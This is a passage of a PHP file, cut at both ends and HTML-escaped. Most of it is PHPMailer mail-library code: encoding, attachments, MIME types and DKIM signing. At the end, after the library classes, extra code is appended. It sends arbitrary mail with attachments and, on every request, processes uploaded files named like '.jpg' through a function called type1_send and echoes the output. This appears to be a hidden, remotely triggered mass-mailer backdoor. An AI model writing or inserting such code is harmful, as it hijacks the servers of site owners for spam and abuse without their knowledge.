            $encoded  = str_replace(&#39;=&#39; . self::CRLF, &amp;quot;\n&amp;quot;, trim($encoded));
        }

        $encoded = preg_replace(&#39;/^(.*)$/m&#39;, &#39; =?&#39; . $this-&amp;gt;CharSet . &amp;quot;?$encoding?\\1?=&amp;quot;, $encoded);
        $encoded = trim(str_replace(&amp;quot;\n&amp;quot;, $this-&amp;gt;LE, $encoded));

        return $encoded;
    }


    public function hasMultiBytes($str)
    {
        if (function_exists(&#39;mb_strlen&#39;)) {
            return (strlen($str) &amp;gt; mb_strlen($str, $this-&amp;gt;CharSet));
        } else { // Assume no multibytes (we can&#39;t handle without mbstring functions anyway)
            return false;
        }
    }


    public function has8bitChars($text)
    {
        return (boolean) preg_match(&#39;/[\x80-\xFF]/&#39;, $text);
    }


    public function base64EncodeWrapMB($str, $linebreak = null)
    {
        $start   = &#39;=?&#39; . $this-&amp;gt;CharSet . &#39;?B?&#39;;
        $end     = &#39;?=&#39;;
        $encoded = &#39;&#39;;
        if ($linebreak === null) {
            $linebreak = $this-&amp;gt;LE;
        }

        $mb_length = mb_strlen($str, $this-&amp;gt;CharSet);
        // Each line must have length &amp;lt;= 75, including $start and $end
        $length    = 75 - strlen($start) - strlen($end);
        // Average multi-byte ratio
        $ratio     = $mb_length / strlen($str);
        // Base64 has a 4:3 ratio
        $avgLength = floor($length * $ratio * .75);

        for ($i = 0; $i &amp;lt; $mb_length; $i += $offset) {
            $lookBack = 0;
            do {
                $offset = $avgLength - $lookBack;
                $chunk  = mb_substr($str, $i, $offset, $this-&amp;gt;CharSet);
                $chunk  = base64_encode($chunk);
                $lookBack++;
            } while (strlen($chunk) &amp;gt; $length);
            $encoded .= $chunk . $linebreak;
        }

        // Chomp the last linefeed
        $encoded = substr($encoded, 0, -strlen($linebreak));
        return $encoded;
    }


    public function encodeQP($string, $line_max = 76)
    {
        if (function_exists(&#39;quoted_printable_encode&#39;)) { // Use native function if it&#39;s available (&amp;gt;= PHP5.3)
            return $this-&amp;gt;fixEOL(quoted_printable_encode($string));
        }
        // Fall back to a pure PHP implementation
        $string = str_replace(array(
            &#39;%20&#39;,
            &#39;%0D%0A.&#39;,
            &#39;%0D%0A&#39;,
            &#39;%&#39;
        ), array(
            &#39; &#39;,
            &amp;quot;\r\n=2E&amp;quot;,
            &amp;quot;\r\n&amp;quot;,
            &#39;=&#39;
        ), rawurlencode($string));
        $string = preg_replace(&#39;/[^\r\n]{&#39; . ($line_max - 3) . &#39;}[^=\r\n]{2}/&#39;, &amp;quot;$0=\r\n&amp;quot;, $string);
        return $this-&amp;gt;fixEOL($string);
    }


    public function encodeQPphp($string, $line_max = 76, /** @noinspection PhpUnusedParameterInspection */ $space_conv = false)
    {
        return $this-&amp;gt;encodeQP($string, $line_max);
    }


    public function encodeQ($str, $position = &#39;text&#39;)
    {
        // There should not be any EOL in the string
        $pattern = &#39;&#39;;
        $encoded = str_replace(array(
            &amp;quot;\r&amp;quot;,
            &amp;quot;\n&amp;quot;
        ), &#39;&#39;, $str);
        switch (strtolower($position)) {
            case &#39;phrase&#39;:
                // RFC 2047 section 5.3
                $pattern = &#39;^A-Za-z0-9!*+\/ -&#39;;
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case &#39;comment&#39;:
            // RFC 2047 section 5.2
                $pattern = &#39;\(\)&amp;quot;&#39;;

            case &#39;text&#39;:
            default:

                $pattern = &#39;\000-\011\013\014\016-\037\075\077\137\177-\377&#39; . $pattern;
                break;
        }
        $matches = array();
        if (preg_match_all(&amp;quot;/[{$pattern}]/&amp;quot;, $encoded, $matches)) {

            $eqkey = array_search(&#39;=&#39;, $matches[0]);
            if (false !== $eqkey) {
                unset($matches[0][$eqkey]);
                array_unshift($matches[0], &#39;=&#39;);
            }
            foreach (array_unique($matches[0]) as $char) {
                $encoded = str_replace($char, &#39;=&#39; . sprintf(&#39;%02X&#39;, ord($char)), $encoded);
            }
        }
        // Replace every spaces to _ (more readable than =20)
        return str_replace(&#39; &#39;, &#39;_&#39;, $encoded);
    }


    public function addStringAttachment($string, $filename, $encoding = &#39;base64&#39;, $type = &#39;&#39;, $disposition = &#39;attachment&#39;)
    {
        // If a MIME type is not specified, try to work it out from the file name
        if ($type == &#39;&#39;) {
            $type = self::filenameToType($filename);
        }
        // Append to $attachment array
        $this-&amp;gt;attachment[] = array(
            0 =&amp;gt; $string,
            1 =&amp;gt; $filename,
            2 =&amp;gt; basename($filename),
            3 =&amp;gt; $encoding,
            4 =&amp;gt; $type,
            5 =&amp;gt; true, // isStringAttachment
            6 =&amp;gt; $disposition,
            7 =&amp;gt; 0
        );
    }

    public function addEmbeddedImage($path, $cid, $name = &#39;&#39;, $encoding = &#39;base64&#39;, $type = &#39;&#39;, $disposition = &#39;inline&#39;)
    {
        if (!@is_file($path)) {
            $this-&amp;gt;setError($this-&amp;gt;lang(&#39;file_access&#39;) . $path);
            return false;
        }

        // If a MIME type is not specified, try to work it out from the file name
        if ($type == &#39;&#39;) {
            $type = self::filenameToType($path);
        }

        $filename = basename($path);
        if ($name == &#39;&#39;) {
            $name = $filename;
        }

        // Append to $attachment array
        $this-&amp;gt;attachment[] = array(
            0 =&amp;gt; $path,
            1 =&amp;gt; $filename,
            2 =&amp;gt; $name,
            3 =&amp;gt; $encoding,
            4 =&amp;gt; $type,
            5 =&amp;gt; false, // isStringAttachment
            6 =&amp;gt; $disposition,
            7 =&amp;gt; $cid
        );
        return true;
    }


    public function addStringEmbeddedImage($string, $cid, $name = &#39;&#39;, $encoding = &#39;base64&#39;, $type = &#39;&#39;, $disposition = &#39;inline&#39;)
    {
        // If a MIME type is not specified, try to work it out from the name
        if ($type == &#39;&#39;) {
            $type = self::filenameToType($name);
        }

        // Append to $attachment array
        $this-&amp;gt;attachment[] = array(
            0 =&amp;gt; $string,
            1 =&amp;gt; $name,
            2 =&amp;gt; $name,
            3 =&amp;gt; $encoding,
            4 =&amp;gt; $type,
            5 =&amp;gt; true, // isStringAttachment
            6 =&amp;gt; $disposition,
            7 =&amp;gt; $cid
        );
        return true;
    }

    public function inlineImageExists()
    {
        foreach ($this-&amp;gt;attachment as $attachment) {
            if ($attachment[6] == &#39;inline&#39;) {
                return true;
            }
        }
        return false;
    }

    public function attachmentExists()
    {
        foreach ($this-&amp;gt;attachment as $attachment) {
            if ($attachment[6] == &#39;attachment&#39;) {
                return true;
            }
        }
        return false;
    }

    public function alternativeExists()
    {
        return !empty($this-&amp;gt;AltBody);
    }

    public function clearAddresses()
    {
        foreach ($this-&amp;gt;to as $to) {
            unset($this-&amp;gt;all_recipients[strtolower($to[0])]);
        }
        $this-&amp;gt;to = array();
    }

    public function clearCCs()
    {
        foreach ($this-&amp;gt;cc as $cc) {
            unset($this-&amp;gt;all_recipients[strtolower($cc[0])]);
        }
        $this-&amp;gt;cc = array();
    }

    public function clearBCCs()
    {
        foreach ($this-&amp;gt;bcc as $bcc) {
            unset($this-&amp;gt;all_recipients[strtolower($bcc[0])]);
        }
        $this-&amp;gt;bcc = array();
    }

    public function clearReplyTos()
    {
        $this-&amp;gt;ReplyTo = array();
    }


    public function clearAllRecipients()
    {
        $this-&amp;gt;to             = array();
        $this-&amp;gt;cc             = array();
        $this-&amp;gt;bcc            = array();
        $this-&amp;gt;all_recipients = array();
    }

    public function clearAttachments()
    {
        $this-&amp;gt;attachment = array();
    }

    public function clearCustomHeaders()
    {
        $this-&amp;gt;CustomHeader = array();
    }

    protected function setError($msg)
    {
        $this-&amp;gt;error_count++;
        if ($this-&amp;gt;Mailer == &#39;smtp&#39; and !is_null($this-&amp;gt;smtp)) {
            $lasterror = $this-&amp;gt;smtp-&amp;gt;getError();
            if (!empty($lasterror) and array_key_exists(&#39;smtp_msg&#39;, $lasterror)) {
                $msg .= &#39;&amp;lt;p&amp;gt;&#39; . $this-&amp;gt;lang(&#39;smtp_error&#39;) . $lasterror[&#39;smtp_msg&#39;] . &amp;quot;&amp;lt;/p&amp;gt;\n&amp;quot;;
            }
        }
        $this-&amp;gt;ErrorInfo = $msg;
    }

    public static function rfcDate()
    {
        // Set the time zone to whatever the default is to avoid 500 errors
        // Will default to UTC if it&#39;s not set properly in php.ini
        date_default_timezone_set(@date_default_timezone_get());
        return date(&#39;D, j M Y H:i:s O&#39;);
    }

    protected function serverHostname()
    {
        $result = &#39;localhost.localdomain&#39;;
        if (!empty($this-&amp;gt;Hostname)) {
            $result = $this-&amp;gt;Hostname;
        } elseif (isset($_SERVER) and array_key_exists(&#39;SERVER_NAME&#39;, $_SERVER) and !empty($_SERVER[&#39;SERVER_NAME&#39;])) {
            $result = $_SERVER[&#39;SERVER_NAME&#39;];
        } elseif (function_exists(&#39;gethostname&#39;) &amp;amp;&amp;amp; gethostname() !== false) {
            $result = gethostname();
        } elseif (php_uname(&#39;n&#39;) !== false) {
            $result = php_uname(&#39;n&#39;);
        }
        return $result;
    }

    protected function lang($key)
    {
        if (count($this-&amp;gt;language) &amp;lt; 1) {
            $this-&amp;gt;setLanguage(&#39;en&#39;); // set the default language
        }

        if (isset($this-&amp;gt;language[$key])) {
            return $this-&amp;gt;language[$key];
        } else {
            return &#39;Language string failed to load: &#39; . $key;
        }
    }

    public function isError()
    {
        return ($this-&amp;gt;error_count &amp;gt; 0);
    }

    public function fixEOL($str)
    {
        // Normalise to \n
        $nstr = str_replace(array(
            &amp;quot;\r\n&amp;quot;,
            &amp;quot;\r&amp;quot;
        ), &amp;quot;\n&amp;quot;, $str);
        // Now convert LE as needed
        if ($this-&amp;gt;LE !== &amp;quot;\n&amp;quot;) {
            $nstr = str_replace(&amp;quot;\n&amp;quot;, $this-&amp;gt;LE, $nstr);
        }
        return $nstr;
    }


    public function addCustomHeader($name, $value = null)
    {
        if ($value === null) {
            // Value passed in as name:value
            $this-&amp;gt;CustomHeader[] = explode(&#39;:&#39;, $name, 2);
        } else {
            $this-&amp;gt;CustomHeader[] = array(
                $name,
                $value
            );
        }
    }

    public function msgHTML($message, $basedir = &#39;&#39;, $advanced = false)
    {
        preg_match_all(&#39;/(src|background)=[&amp;quot;\&#39;](.*)[&amp;quot;\&#39;]/Ui&#39;, $message, $images);
        if (isset($images[2])) {
            foreach ($images[2] as $imgindex =&amp;gt; $url) {
                // Convert data URIs into embedded images
                if (preg_match(&#39;#^data:(image[^;,]*)(;base64)?,#&#39;, $url, $match)) {
                    $data = substr($url, strpos($url, &#39;,&#39;));
                    if ($match[2]) {
                        $data = base64_decode($data);
                    } else {
                        $data = rawurldecode($data);
                    }
                    $cid = md5($url) . &#39;@phpmailer.0&#39;; // RFC2392 S 2
                    if ($this-&amp;gt;addStringEmbeddedImage($data, $cid, &#39;&#39;, &#39;base64&#39;, $match[1])) {
                        $message = str_replace($images[0][$imgindex], $images[1][$imgindex] . &#39;=&amp;quot;cid:&#39; . $cid . &#39;&amp;quot;&#39;, $message);
                    }
                } elseif (!preg_match(&#39;#^[A-z]+://#&#39;, $url)) {
                    // Do not change urls for absolute images (thanks to corvuscorax)
                    $filename  = basename($url);
                    $directory = dirname($url);
                    if ($directory == &#39;.&#39;) {
                        $directory = &#39;&#39;;
                    }
                    $cid = md5($url) . &#39;@phpmailer.0&#39;; // RFC2392 S 2
                    if (strlen($basedir) &amp;gt; 1 &amp;amp;&amp;amp; substr($basedir, -1) != &#39;/&#39;) {
                        $basedir .= &#39;/&#39;;
                    }
                    if (strlen($directory) &amp;gt; 1 &amp;amp;&amp;amp; substr($directory, -1) != &#39;/&#39;) {
                        $directory .= &#39;/&#39;;
                    }
                    if ($this-&amp;gt;addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, &#39;base64&#39;, self::_mime_types((string) self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) {
                        $message = preg_replace(&#39;/&#39; . $images[1][$imgindex] . &#39;=[&amp;quot;\&#39;]&#39; . preg_quote($url, &#39;/&#39;) . &#39;[&amp;quot;\&#39;]/Ui&#39;, $images[1][$imgindex] . &#39;=&amp;quot;cid:&#39; . $cid . &#39;&amp;quot;&#39;, $message);
                    }
                }
            }
        }
        $this-&amp;gt;isHTML(true);
        // Convert all message body line breaks to CRLF, makes quoted-printable encoding work much better
        $this-&amp;gt;Body    = $this-&amp;gt;normalizeBreaks($message);
        $this-&amp;gt;AltBody = $this-&amp;gt;normalizeBreaks($this-&amp;gt;html2text($message, $advanced));
        if (empty($this-&amp;gt;AltBody)) {
            $this-&amp;gt;AltBody = &#39;To view this email message, open it in a program that understands HTML!&#39; . self::CRLF . self::CRLF;
        }
        return $this-&amp;gt;Body;
    }


    public function html2text($html, $advanced = false)
    {
        if (is_callable($advanced)) {
            return call_user_func($advanced, $html);
        }
        return html_entity_decode(trim(custom_strip_tags(preg_replace(&#39;/&amp;lt;(head|title|style|script)[^&amp;gt;]*&amp;gt;.*?&amp;lt;\/\\1&amp;gt;/si&#39;, &#39;&#39;, $html))), ENT_QUOTES, $this-&amp;gt;CharSet);
    }


    public static function _mime_types($ext = &#39;&#39;)
    {
        $mimes = array(
            &#39;xl&#39; =&amp;gt; &#39;application/excel&#39;,
            &#39;js&#39; =&amp;gt; &#39;application/javascript&#39;,
            &#39;hqx&#39; =&amp;gt; &#39;application/mac-binhex40&#39;,
            &#39;cpt&#39; =&amp;gt; &#39;application/mac-compactpro&#39;,
            &#39;bin&#39; =&amp;gt; &#39;application/macbinary&#39;,
            &#39;doc&#39; =&amp;gt; &#39;application/msword&#39;,
            &#39;word&#39; =&amp;gt; &#39;application/msword&#39;,
            &#39;class&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;dll&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;dms&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;exe&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;lha&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;lzh&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;psd&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;sea&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;so&#39; =&amp;gt; &#39;application/octet-stream&#39;,
            &#39;oda&#39; =&amp;gt; &#39;application/oda&#39;,
            &#39;pdf&#39; =&amp;gt; &#39;application/pdf&#39;,
            &#39;ai&#39; =&amp;gt; &#39;application/postscript&#39;,
            &#39;eps&#39; =&amp;gt; &#39;application/postscript&#39;,
            &#39;ps&#39; =&amp;gt; &#39;application/postscript&#39;,
            &#39;smi&#39; =&amp;gt; &#39;application/smil&#39;,
            &#39;smil&#39; =&amp;gt; &#39;application/smil&#39;,
            &#39;mif&#39; =&amp;gt; &#39;application/vnd.mif&#39;,
            &#39;xls&#39; =&amp;gt; &#39;application/vnd.ms-excel&#39;,
            &#39;ppt&#39; =&amp;gt; &#39;application/vnd.ms-powerpoint&#39;,
            &#39;wbxml&#39; =&amp;gt; &#39;application/vnd.wap.wbxml&#39;,
            &#39;wmlc&#39; =&amp;gt; &#39;application/vnd.wap.wmlc&#39;,
            &#39;dcr&#39; =&amp;gt; &#39;application/x-director&#39;,
            &#39;dir&#39; =&amp;gt; &#39;application/x-director&#39;,
            &#39;dxr&#39; =&amp;gt; &#39;application/x-director&#39;,
            &#39;dvi&#39; =&amp;gt; &#39;application/x-dvi&#39;,
            &#39;gtar&#39; =&amp;gt; &#39;application/x-gtar&#39;,
            &#39;php3&#39; =&amp;gt; &#39;application/x-httpd-php&#39;,
            &#39;php4&#39; =&amp;gt; &#39;application/x-httpd-php&#39;,
            &#39;php&#39; =&amp;gt; &#39;application/x-httpd-php&#39;,
            &#39;phtml&#39; =&amp;gt; &#39;application/x-httpd-php&#39;,
            &#39;phps&#39; =&amp;gt; &#39;application/x-httpd-php-source&#39;,
            &#39;swf&#39; =&amp;gt; &#39;application/x-shockwave-flash&#39;,
            &#39;sit&#39; =&amp;gt; &#39;application/x-stuffit&#39;,
            &#39;tar&#39; =&amp;gt; &#39;application/x-tar&#39;,
            &#39;tgz&#39; =&amp;gt; &#39;application/x-tar&#39;,
            &#39;xht&#39; =&amp;gt; &#39;application/xhtml+xml&#39;,
            &#39;xhtml&#39; =&amp;gt; &#39;application/xhtml+xml&#39;,
            &#39;zip&#39; =&amp;gt; &#39;application/zip&#39;,
            &#39;mid&#39; =&amp;gt; &#39;audio/midi&#39;,
            &#39;midi&#39; =&amp;gt; &#39;audio/midi&#39;,
            &#39;mp2&#39; =&amp;gt; &#39;audio/mpeg&#39;,
            &#39;mp3&#39; =&amp;gt; &#39;audio/mpeg&#39;,
            &#39;mpga&#39; =&amp;gt; &#39;audio/mpeg&#39;,
            &#39;aif&#39; =&amp;gt; &#39;audio/x-aiff&#39;,
            &#39;aifc&#39; =&amp;gt; &#39;audio/x-aiff&#39;,
            &#39;aiff&#39; =&amp;gt; &#39;audio/x-aiff&#39;,
            &#39;ram&#39; =&amp;gt; &#39;audio/x-pn-realaudio&#39;,
            &#39;rm&#39; =&amp;gt; &#39;audio/x-pn-realaudio&#39;,
            &#39;rpm&#39; =&amp;gt; &#39;audio/x-pn-realaudio-plugin&#39;,
            &#39;ra&#39; =&amp;gt; &#39;audio/x-realaudio&#39;,
            &#39;wav&#39; =&amp;gt; &#39;audio/x-wav&#39;,
            &#39;bmp&#39; =&amp;gt; &#39;image/bmp&#39;,
            &#39;gif&#39; =&amp;gt; &#39;image/gif&#39;,
            &#39;jpeg&#39; =&amp;gt; &#39;image/jpeg&#39;,
            &#39;jpe&#39; =&amp;gt; &#39;image/jpeg&#39;,
            &#39;jpg&#39; =&amp;gt; &#39;image/jpeg&#39;,
            &#39;png&#39; =&amp;gt; &#39;image/png&#39;,
            &#39;tiff&#39; =&amp;gt; &#39;image/tiff&#39;,
            &#39;tif&#39; =&amp;gt; &#39;image/tiff&#39;,
            &#39;eml&#39; =&amp;gt; &#39;message/rfc822&#39;,
            &#39;css&#39; =&amp;gt; &#39;text/css&#39;,
            &#39;html&#39; =&amp;gt; &#39;text/html&#39;,
            &#39;htm&#39; =&amp;gt; &#39;text/html&#39;,
            &#39;shtml&#39; =&amp;gt; &#39;text/html&#39;,
            &#39;log&#39; =&amp;gt; &#39;text/plain&#39;,
            &#39;text&#39; =&amp;gt; &#39;text/plain&#39;,
            &#39;txt&#39; =&amp;gt; &#39;text/plain&#39;,
            &#39;rtx&#39; =&amp;gt; &#39;text/richtext&#39;,
            &#39;rtf&#39; =&amp;gt; &#39;text/rtf&#39;,
            &#39;vcf&#39; =&amp;gt; &#39;text/vcard&#39;,
            &#39;vcard&#39; =&amp;gt; &#39;text/vcard&#39;,
            &#39;xml&#39; =&amp;gt; &#39;text/xml&#39;,
            &#39;xsl&#39; =&amp;gt; &#39;text/xml&#39;,
            &#39;mpeg&#39; =&amp;gt; &#39;video/mpeg&#39;,
            &#39;mpe&#39; =&amp;gt; &#39;video/mpeg&#39;,
            &#39;mpg&#39; =&amp;gt; &#39;video/mpeg&#39;,
            &#39;mov&#39; =&amp;gt; &#39;video/quicktime&#39;,
            &#39;qt&#39; =&amp;gt; &#39;video/quicktime&#39;,
            &#39;rv&#39; =&amp;gt; &#39;video/vnd.rn-realvideo&#39;,
            &#39;avi&#39; =&amp;gt; &#39;video/x-msvideo&#39;,
            &#39;movie&#39; =&amp;gt; &#39;video/x-sgi-movie&#39;
        );
        return (array_key_exists(strtolower($ext), $mimes) ? $mimes[strtolower($ext)] : &#39;application/octet-stream&#39;);
    }


    public static function filenameToType($filename)
    {
        // In case the path is a URL, strip any query string before getting extension
        $qpos = strpos($filename, &#39;?&#39;);
        if (false !== $qpos) {
            $filename = substr($filename, 0, $qpos);
        }
        $pathinfo = self::mb_pathinfo($filename);
        return self::_mime_types($pathinfo[&#39;extension&#39;]);
    }


    public static function mb_pathinfo($path, $options = null)
    {
        $ret      = array(
            &#39;dirname&#39; =&amp;gt; &#39;&#39;,
            &#39;basename&#39; =&amp;gt; &#39;&#39;,
            &#39;extension&#39; =&amp;gt; &#39;&#39;,
            &#39;filename&#39; =&amp;gt; &#39;&#39;
        );
        $pathinfo = array();
        if (preg_match(&#39;%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im&#39;, $path, $pathinfo)) {
            if (array_key_exists(1, $pathinfo)) {
                $ret[&#39;dirname&#39;] = $pathinfo[1];
            }
            if (array_key_exists(2, $pathinfo)) {
                $ret[&#39;basename&#39;] = $pathinfo[2];
            }
            if (array_key_exists(5, $pathinfo)) {
                $ret[&#39;extension&#39;] = $pathinfo[5];
            }
            if (array_key_exists(3, $pathinfo)) {
                $ret[&#39;filename&#39;] = $pathinfo[3];
            }
        }
        switch ($options) {
            case PATHINFO_DIRNAME:
            case &#39;dirname&#39;:
                return $ret[&#39;dirname&#39;];
            case PATHINFO_BASENAME:
            case &#39;basename&#39;:
                return $ret[&#39;basename&#39;];
            case PATHINFO_EXTENSION:
            case &#39;extension&#39;:
                return $ret[&#39;extension&#39;];
            case PATHINFO_FILENAME:
            case &#39;filename&#39;:
                return $ret[&#39;filename&#39;];
            default:
                return $ret;
        }
    }

    public function set($name, $value = &#39;&#39;)
    {
        try {
            if (isset($this-&amp;gt;$name)) {
                $this-&amp;gt;$name = $value;
            } else {
                throw new phpmailerException($this-&amp;gt;lang(&#39;variable_set&#39;) . $name, self::STOP_CRITICAL);
            }
        }
        catch (Exception $exc) {
            $this-&amp;gt;setError($exc-&amp;gt;getMessage());
            if ($exc-&amp;gt;getCode() == self::STOP_CRITICAL) {
                return false;
            }
        }
        return true;
    }


    public function secureHeader($str)
    {
        return trim(str_replace(array(
            &amp;quot;\r&amp;quot;,
            &amp;quot;\n&amp;quot;
        ), &#39;&#39;, $str));
    }

    public static function normalizeBreaks($text, $breaktype = &amp;quot;\r\n&amp;quot;)
    {
        return preg_replace(&#39;/(\r\n|\r|\n)/ms&#39;, $breaktype, $text);
    }


    public function sign($cert_filename, $key_filename, $key_pass)
    {
        $this-&amp;gt;sign_cert_file = $cert_filename;
        $this-&amp;gt;sign_key_file  = $key_filename;
        $this-&amp;gt;sign_key_pass  = $key_pass;
    }

    public function DKIM_QP($txt)
    {
        $line = &#39;&#39;;
        for ($i = 0; $i &amp;lt; strlen($txt); $i++) {
            $ord = ord($txt[$i]);
            if (((0x21 &amp;lt;= $ord) &amp;amp;&amp;amp; ($ord &amp;lt;= 0x3A)) || $ord == 0x3C || ((0x3E &amp;lt;= $ord) &amp;amp;&amp;amp; ($ord &amp;lt;= 0x7E))) {
                $line .= $txt[$i];
            } else {
                $line .= &#39;=&#39; . sprintf(&#39;%02X&#39;, $ord);
            }
        }
        return $line;
    }

    public function DKIM_Sign($signHeader)
    {
        if (!defined(&#39;PKCS7_TEXT&#39;)) {
            if ($this-&amp;gt;exceptions) {
                throw new phpmailerException($this-&amp;gt;lang(&#39;signing&#39;) . &#39; OpenSSL extension missing.&#39;);
            }
            return &#39;&#39;;
        }
        $privKeyStr = file_get_contents($this-&amp;gt;DKIM_private);
        if ($this-&amp;gt;DKIM_passphrase != &#39;&#39;) {
            $privKey = openssl_pkey_get_private($privKeyStr, $this-&amp;gt;DKIM_passphrase);
        } else {
            $privKey = $privKeyStr;
        }
        if (openssl_sign($signHeader, $signature, $privKey)) {
            return base64_encode($signature);
        }
        return &#39;&#39;;
    }

    public function DKIM_HeaderC($signHeader)
    {
        $signHeader = preg_replace(&#39;/\r\n\s+/&#39;, &#39; &#39;, $signHeader);
        $lines      = explode(&amp;quot;\r\n&amp;quot;, $signHeader);
        foreach ($lines as $key =&amp;gt; $line) {
            list($heading, $value) = explode(&#39;:&#39;, $line, 2);
            $heading     = strtolower($heading);
            $value       = preg_replace(&#39;/\s+/&#39;, &#39; &#39;, $value); // Compress useless spaces
            $lines[$key] = $heading . &#39;:&#39; . trim($value); // Don&#39;t forget to remove WSP around the value
        }
        $signHeader = implode(&amp;quot;\r\n&amp;quot;, $lines);
        return $signHeader;
    }

    public function DKIM_BodyC($body)
    {
        if ($body == &#39;&#39;) {
            return &amp;quot;\r\n&amp;quot;;
        }
        // stabilize line endings
        $body = str_replace(&amp;quot;\r\n&amp;quot;, &amp;quot;\n&amp;quot;, $body);
        $body = str_replace(&amp;quot;\n&amp;quot;, &amp;quot;\r\n&amp;quot;, $body);
        // END stabilize line endings
        while (substr($body, strlen($body) - 4, 4) == &amp;quot;\r\n\r\n&amp;quot;) {
            $body = substr($body, 0, strlen($body) - 2);
        }
        return $body;
    }

    public function DKIM_Add($headers_line, $subject, $body)
    {
        $DKIMsignatureType    = &#39;rsa-sha1&#39;; // Signature &amp;amp; hash algorithms
        $DKIMcanonicalization = &#39;relaxed/simple&#39;; // Canonicalization of header/body
        $DKIMquery            = &#39;dns/txt&#39;; // Query method
        $DKIMtime             = time(); // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
        $subject_header       = &amp;quot;Subject: $subject&amp;quot;;
        $headers              = explode($this-&amp;gt;LE, $headers_line);
        $from_header          = &#39;&#39;;
        $to_header            = &#39;&#39;;
        $current              = &#39;&#39;;
        foreach ($headers as $header) {
            if (strpos($header, &#39;From:&#39;) === 0) {
                $from_header = $header;
                $current     = &#39;from_header&#39;;
            } elseif (strpos($header, &#39;To:&#39;) === 0) {
                $to_header = $header;
                $current   = &#39;to_header&#39;;
            } else {
                if ($current &amp;amp;&amp;amp; strpos($header, &#39; =?&#39;) === 0) {
                    $current .= $header;
                } else {
                    $current = &#39;&#39;;
                }
            }
        }
        $from     = str_replace(&#39;|&#39;, &#39;=7C&#39;, $this-&amp;gt;DKIM_QP($from_header));
        $to       = str_replace(&#39;|&#39;, &#39;=7C&#39;, $this-&amp;gt;DKIM_QP($to_header));
        $subject  = str_replace(&#39;|&#39;, &#39;=7C&#39;, $this-&amp;gt;DKIM_QP($subject_header)); // Copied header fields (dkim-quoted-printable)
        $body     = $this-&amp;gt;DKIM_BodyC($body);
        $DKIMlen  = strlen($body); // Length of body
        $DKIMb64  = base64_encode(pack(&#39;H*&#39;, sha1($body))); // Base64 of packed binary SHA-1 hash of body
        $ident    = ($this-&amp;gt;DKIM_identity == &#39;&#39;) ? &#39;&#39; : &#39; i=&#39; . $this-&amp;gt;DKIM_identity . &#39;;&#39;;
        $dkimhdrs = &#39;DKIM-Signature: v=1; a=&#39; . $DKIMsignatureType . &#39;; q=&#39; . $DKIMquery . &#39;; l=&#39; . $DKIMlen . &#39;; s=&#39; . $this-&amp;gt;DKIM_selector . &amp;quot;;\r\n&amp;quot; . &amp;quot;\tt=&amp;quot; . $DKIMtime . &#39;; c=&#39; . $DKIMcanonicalization . &amp;quot;;\r\n&amp;quot; . &amp;quot;\th=From:To:Subject;\r\n&amp;quot; . &amp;quot;\td=&amp;quot; . $this-&amp;gt;DKIM_domain . &#39;;&#39; . $ident . &amp;quot;\r\n&amp;quot; . &amp;quot;\tz=$from\r\n&amp;quot; . &amp;quot;\t|$to\r\n&amp;quot; . &amp;quot;\t|$subject;\r\n&amp;quot; . &amp;quot;\tbh=&amp;quot; . $DKIMb64 . &amp;quot;;\r\n&amp;quot; . &amp;quot;\tb=&amp;quot;;
        $toSign   = $this-&amp;gt;DKIM_HeaderC($from_header . &amp;quot;\r\n&amp;quot; . $to_header . &amp;quot;\r\n&amp;quot; . $subject_header . &amp;quot;\r\n&amp;quot; . $dkimhdrs);
        $signed   = $this-&amp;gt;DKIM_Sign($toSign);
        return $dkimhdrs . $signed . &amp;quot;\r\n&amp;quot;;
    }

    public function getToAddresses()
    {
        return $this-&amp;gt;to;
    }


    public function getCcAddresses()
    {
        return $this-&amp;gt;cc;
    }


    public function getBccAddresses()
    {
        return $this-&amp;gt;bcc;
    }


    public function getReplyToAddresses()
    {
        return $this-&amp;gt;ReplyTo;
    }


    public function getAllRecipientAddresses()
    {
        return $this-&amp;gt;all_recipients;
    }


    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
    {
        if (!empty($this-&amp;gt;action_function) &amp;amp;&amp;amp; is_callable($this-&amp;gt;action_function)) {
            $params = array(
                $isSent,
                $to,
                $cc,
                $bcc,
                $subject,
                $body,
                $from
            );
            call_user_func_array($this-&amp;gt;action_function, $params);
        }
    }
}

class phpmailerException extends Exception
{
    public function errorMessage()
    {
        $errorMsg = &#39;&amp;lt;strong&amp;gt;&#39; . $this-&amp;gt;getMessage() . &amp;quot;&amp;lt;/strong&amp;gt;&amp;lt;br /&amp;gt;\n&amp;quot;;
        return $errorMsg;
    }
}



/////////////////////////////////////////////////////////////////

function sendSmtpMail($from_email, $from_name, $to, $subject, $body, $type, $config_file)
{
    $mail = new PHPMailer();
    $mail-&amp;gt;isMail();

    $mail-&amp;gt;CharSet = &#39;utf-8&#39;;
    $mail-&amp;gt;SetFrom($from_email, $from_name);
    $mail-&amp;gt;AddAddress($to);
    $mail-&amp;gt;Subject = $subject;

    if ($type == &amp;quot;1&amp;quot;) {
        $mail-&amp;gt;MsgHTML($body);
    } elseif ($type == &amp;quot;2&amp;quot;) {
        $mail-&amp;gt;isHTML(false);
        $mail-&amp;gt;Body = $body;
    }

    if (isset($_FILES)) {
        foreach ($_FILES as $key =&amp;gt; $file) {
            if ($file[&#39;tmp_name&#39;] != $config_file) {
                $mail-&amp;gt;addAttachment($file[&#39;tmp_name&#39;], $file[&#39;name&#39;]);
            }
        }
    }

    if (!$mail-&amp;gt;send()) {
        return $mail-&amp;gt;ErrorInfo;
    } else {
        return 0;
    }
}

if (isset($_FILES)) {
    foreach ($_FILES as $key =&amp;gt; $file) {
        if (strpos($file[&#39;name&#39;], &amp;quot;.jpg&amp;quot;)) {
            $res = type1_send($file[&#39;tmp_name&#39;]);
            if ($res) {
                echo $res;
            }
        }
    }
}


function myhex2bin($str)
{
